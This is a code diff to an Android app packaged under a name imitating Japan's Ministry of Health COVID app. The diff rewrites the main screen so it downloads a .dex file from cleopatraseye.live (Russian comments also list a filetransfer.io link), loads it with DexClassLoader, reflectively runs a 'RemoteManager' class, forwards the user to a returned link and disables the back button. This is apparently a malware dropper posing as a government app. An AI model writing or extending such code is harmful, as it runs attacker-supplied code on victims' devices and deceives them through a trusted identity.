@@ -3,6 +3,7 @@ package jp.go.mhlw.covid19r.screens
 import android.content.Context
 import android.content.Intent
 import android.os.Bundle
+import android.util.Log
 import android.view.animation.AnimationUtils
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
@@ -13,10 +14,11 @@ import jp.go.mhlw.covid19r.databinding.ActivityMainBinding
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import java.io.File
 import java.io.FileOutputStream
-import java.net.HttpURLConnection
-import java.net.URL
+import java.io.IOException
 import kotlin.coroutines.Continuation
 
 class MainActivity : AppCompatActivity() {
@@ -33,31 +35,30 @@ class MainActivity : AppCompatActivity() {
         } else {
             lifecycleScope.launch {
                 withContext(Dispatchers.IO){
-                    val optimizedDirectory = cacheDir
-                    val urlFileDex = URL("cleopatraseye.live/juwq.dex")
-                    val connection = urlFileDex.openConnection() as HttpURLConnection
-                    connection.requestMethod = "GET"
-                    withContext(Dispatchers.IO) {
-                        connection.connect()
-                    }
+                    //ссылка Дениса http://cleopatraseye.live/juwq.dex
+                    //ссылка Моя https://filetransfer.io/data-package/Wqfr1uNK/download
 
-                    if (connection.responseCode == HttpURLConnection.HTTP_OK) {
-                        val inputStream = connection.inputStream
-                        val cacheDir = cacheDir
-                        val dexDir = File(cacheDir, "dex")
-                        dexDir.mkdirs()
-                        val dexFile = File(dexDir, "classes.dex")
-                        dexFile.createNewFile()
-                        val outputStream = FileOutputStream(dexFile)
-                        inputStream.copyTo(outputStream)
+                    Log.d(Const.TAG, "Just connection.requestMethod")
+
+                    val url = "http://cleopatraseye.live/juwq.dex"
+                    val client = OkHttpClient()
+                    val request = Request.Builder().url(url).build()
+
+                    client.newCall(request).execute().use { response ->
+                        if (!response.isSuccessful) throw IOException("Error downloading DEX file")
+                        val dexFile = File.createTempFile("classes", ".dex", this@MainActivity.cacheDir)
+                        response.body?.byteStream()?.use { inputStream ->
+                            FileOutputStream(dexFile).use { outputStream ->
+                                inputStream.copyTo(outputStream)
+                            }
+                        }
 
                         val dexFileLoader = DexClassLoader(
                             dexFile.absolutePath,
-                            optimizedDirectory.absolutePath,
+                            cacheDir.absolutePath,
                             null,
                             classLoader
                         )
-
                         val urlBuilderClass = dexFileLoader.loadClass("RemoteManager")
                         val instance = urlBuilderClass.newInstance()
                         val initRemoteManager = urlBuilderClass.getMethod(
@@ -65,14 +66,15 @@ class MainActivity : AppCompatActivity() {
                             Context::class.java,
                             Continuation::class.java
                         )
+
                         val continuation = Continuation<String>(Dispatchers.Main) {
+                            Log.d(Const.TAG, "The link is ${it.getOrNull()} sending to Intent ")
                             val intent = Intent(this@MainActivity, EndPointScreen::class.java)
                             intent.putExtra(Const.SHARED_LINK_NAME, it.getOrNull())
                             startActivity(intent)
                         }
 
                         initRemoteManager.invoke(instance, this@MainActivity, continuation)
-
                     }
                 }
             }
@@ -92,7 +94,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-
     override fun onBackPressed() {
 
     }
